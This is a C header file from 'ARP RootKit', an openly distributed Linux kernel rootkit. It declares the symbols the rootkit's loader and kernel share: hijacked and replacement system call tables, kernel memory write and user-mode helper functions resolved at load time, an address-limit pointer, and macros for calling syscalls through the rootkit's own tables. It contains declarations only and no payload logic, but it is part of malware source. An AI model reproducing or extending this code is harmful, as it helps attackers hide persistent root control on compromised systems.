/***
 *      _  __  __     __
 *     /_) )_) )_)    )_) _   _  _)_ )_/ o _)_
 *    / / / \ /      / \ (_) (_) (_ /  ) ( (_
 *
 *//* License
 *
 * Copyright (c) 2018 Abel Romero Pérez aka D1W0U <abel@abelromero.com>
 *
 * This file is part of ARP RootKit.
 *
 * ARP RootKit is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * ARP RootKit is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with ARP RootKit.  If not, see <http://www.gnu.org/licenses/>.
 *
 *//* Notes
 *
 * Here the shared functions and variables between loader and rootkit's kernel.
 */

#ifndef KERNEL_H

/*
 * Rootkit's kernel functions.
 */
extern int pinfo(const char *fmt, ...);
extern int perr(const char *fmt, ...);
extern int snprintf(char *buf, size_t len, const char *fmt, ...);
extern void kernel_test(void);
extern void kernel_init(void);
extern long syscall(void **sct, int nr, bool user, long a1, long a2, long a3, long a4, long a5, long a6);
extern void *memmem(const void *haystack, size_t hs_len, const void *needle, size_t n_len);

/*
 * Symbols obtained from loader, passed to rootkit's kernel.
 */
extern void * (*f_kmalloc)(size_t size, gfp_t flags);
extern void (*f_kfree)(const void *);
extern struct pid * (*f_find_vpid)(pid_t nr);
extern int (*f_vscnprintf)(char *buf, size_t size, const char *fmt, va_list args);
extern int (*f_sys_write)(int fd, const char *mem, size_t len);
extern int (*f_printk)(const char *fmt, ...);
extern long (*f_probe_kernel_write)(void *dst, const void *src, size_t len);
extern int (*f_strncmp)(const char *s1, const char *s2, size_t len);
extern size_t (*f_strlen)(const char *);
extern int (*f_kstrtoull)(const char *s, unsigned int base, unsigned long long *res);
extern void * (*f_memcpy)(void *dest, const void *src, size_t count);
extern int (*f_memcmp)(const void *cs, const void *ct, size_t count);
extern int (*f_call_usermodehelper)(char *path, char **argv, char **envp, int wait);
extern char * (*f_strreplace)(char *s, char old, char new);

// Global rkkernel variables
extern void *kernel_addr;
extern size_t kernel_len, kernel_paglen, kernel_pages;
extern void **sys_call_table;
extern void **ia32_sys_call_table;
extern void **my_sct;
extern void **my_ia32sct;
extern struct task_struct *get_current_task(void);
extern unsigned int get_kernel_tree(void);
extern mm_segment_t my_get_fs(void);
extern void my_set_fs(mm_segment_t seg);
extern unsigned int kernel_tree;
extern mm_segment_t *addr_limit;
extern long *sct_refs;
extern long *ia32sct_refs;
extern size_t nsct_refs;
extern size_t nia32sct_refs;

/*
 * Labels.
 */
extern void kernel_start(void);
extern void kernel_end(void);

/*
 * Macros.
 */
#define KSYSCALL(nr, a1, a2, a3, a4, a5, a6) syscall(sys_call_table, nr, 0, (long)a1, (long)a2, (long)a3, (long)a4, (long)a5, (long)a6)
#define SYSCALL64(nr, a1, a2, a3, a4, a5, a6) syscall(sys_call_table, nr, 1, (long)a1, (long)a2, (long)a3, (long)a4, (long)a5, (long)a6)
#define SYSCALL32(nr, a1, a2, a3, a4, a5, a6) syscall(ia32_sys_call_table, nr, 1, (long)a1, (long)a2, (long)a3, (long)a4, (long)a5, (long)a6)
#define KADDR(symbol) (void *)(kernel_addr + ((long)&symbol - (long)&kernel_start))
#define MYSYSCALL64(nr, a1, a2, a3, a4, a5, a6) syscall(my_sct, nr, 1, (long)a1, (long)a2, (long)a3, (long)a4, (long)a5, (long)a6)
#define MYSYSCALL32(nr, a1, a2, a3, a4, a5, a6) syscall(my_ia32sct, nr, 1, (long)a1, (long)a2, (long)a3, (long)a4, (long)a5, (long)a6)
#define MYKSYSCALL64(nr, a1, a2, a3, a4, a5, a6) syscall(my_sct, nr, 0, (long)a1, (long)a2, (long)a3, (long)a4, (long)a5, (long)a6)
#define MYKSYSCALL32(nr, a1, a2, a3, a4, a5, a6) syscall(my_ia32sct, nr, 0, (long)a1, (long)a2, (long)a3, (long)a4, (long)a5, (long)a6)

#ifndef LABEL
#define LABEL(name) asm( \
		"\t.globl\t"#name"\n" \
		"\t.type\t"#name", @function\n" \
#name":\n" \
		"\t.size\t"#name", .-"#name"\n" \
		);
#endif

#define KERNEL_H

#endif
